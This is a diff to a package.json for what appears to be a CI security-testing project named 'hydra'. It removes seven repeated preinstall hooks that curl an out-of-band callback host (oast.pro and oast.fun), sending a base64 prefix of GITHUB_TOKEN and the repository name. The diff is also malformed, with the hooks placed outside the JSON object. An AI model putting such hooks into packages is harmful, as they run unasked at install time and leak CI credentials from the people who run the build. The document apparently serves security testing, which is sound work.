@@ -1,16 +1,7 @@
-"preinstall": "curl -s 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro/hydra?t=$(printf '%s' "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null"
-"preinstall": "curl -s 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro/hydra?t=$(printf '%s' "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null"
-"preinstall": "curl -s 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro?t=$(printf '%s' "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null"
-"preinstall": "curl -s 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro?t=$(printf '%s' "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null"
-"preinstall": "curl -s 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro?t=$(printf '%s' "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null"
-"preinstall": "curl -s 'https://oast.fun/hydra?t=$(printf '%s' "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null"
-"preinstall": "curl -s 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro/hydra?t=$(printf '%s' "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null"
 {
-  "name": "hydra-test-issue-comment",
+  "name": "hydra-e2e-target",
   "version": "1.0.0",
-  "description": "Multi-workflow test repository for HYDRA E2E pipeline",
-  "license": "MIT",
   "scripts": {
-    "test": "echo 'Running tests...' && exit 0"
+    "test": "echo 'tests pass'"
   }
 }
